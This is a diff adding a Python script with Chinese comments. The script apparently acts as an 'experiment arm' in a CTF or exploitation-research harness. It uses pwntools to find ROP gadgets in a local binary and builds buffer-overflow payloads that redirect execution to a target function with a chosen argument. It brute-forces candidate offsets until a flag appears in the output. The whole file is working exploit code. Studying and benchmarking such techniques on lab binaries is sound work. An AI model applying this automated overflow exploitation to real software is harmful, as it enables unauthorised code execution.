@@ -1,0 +1,95 @@
+"""pwntools 实验臂：在 WSL 里用 pwntools 构造并执行 payload。
+
+输入（argv[1]）：JSON
+    {"binary": "/mnt/.../p1", "target": 4198774, "mode": "none|rdi|rsi_rbp",
+     "arg": 305419896, "offset_candidates": [72, 80, ...], "flag": "flag{...}"}
+输出：JSON {"solved", "offset", "attempts", "gadget", "error"}
+"""
+
+from __future__ import annotations
+
+import json
+import sys
+import time
+
+context_error = None
+try:
+    from pwn import ELF, ROP, context, p64, process
+
+    context.log_level = "error"
+except ImportError as error:  # pragma: no cover - 环境缺失时如实报告
+    context_error = str(error)
+
+
+def build_payload(elf, target: int, mode: str, arg: int, offset: int) -> tuple[bytes, str]:
+    rop = ROP(elf)
+    ret = None
+    try:
+        ret = rop.find_gadget(["ret"]).address
+    except Exception:  # noqa: BLE001 - ret 只用于对齐，不是必需
+        ret = None
+    if mode == "none":
+        payload = b"A" * offset
+        if ret is not None:
+            payload += p64(ret)
+        payload += p64(target)
+        return payload, "ret"
+    if mode == "rdi":
+        gadget = rop.find_gadget(["pop rdi", "ret"])
+        if gadget is None:
+            raise RuntimeError("gadget_missing:pop rdi;ret")
+        payload = b"A" * offset
+        if ret is not None:
+            payload += p64(ret)
+        payload += p64(gadget.address) + p64(arg) + p64(target)
+        return payload, f"pop rdi;ret@{hex(gadget.address)}"
+    if mode == "rsi_rbp":
+        gadget = rop.find_gadget(["pop rsi", "pop rbp", "ret"])
+        if gadget is None:
+            raise RuntimeError("gadget_missing:pop rsi;pop rbp;ret")
+        payload = b"A" * offset
+        if ret is not None:
+            payload += p64(ret)
+        payload += p64(gadget.address) + p64(arg) + p64(0) + p64(target)
+        return payload, f"pop rsi;pop rbp;ret@{hex(gadget.address)}"
+    raise RuntimeError(f"unknown mode: {mode}")
+
+
+def main() -> None:
+    request = json.loads(sys.argv[1])
+    result = {"solved": False, "offset": None, "attempts": 0,
+              "gadget": None, "error": None}
+    if context_error is not None:
+        result["error"] = f"pwntools_unavailable:{context_error}"
+        print(json.dumps(result))
+        return
+
+    started = time.perf_counter()
+    try:
+        elf = ELF(request["binary"], checksec=False)
+        target = int(request["target"])
+        for attempt, offset in enumerate(request["offset_candidates"], 1):
+            result["attempts"] = attempt
+            try:
+                payload, gadget = build_payload(
+                    elf, target, request["mode"], int(request.get("arg", 0)), offset)
+            except RuntimeError as error:
+                result["error"] = str(error)
+                break
+            result["gadget"] = gadget
+            io = process(elf.path)
+            io.send(payload)
+            output = io.recvall(timeout=5) or b""
+            io.close()
+            text = output.decode("utf-8", "replace")
+            if request["flag"].lower() in text.lower():
+                result.update({"solved": True, "offset": offset})
+                break
+    except Exception as error:  # noqa: BLE001 - 实验臂失败要如实记录
+        result["error"] = f"{type(error).__name__}:{error}"
+    result["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+    print(json.dumps(result))
+
+
+if __name__ == "__main__":
+    main()
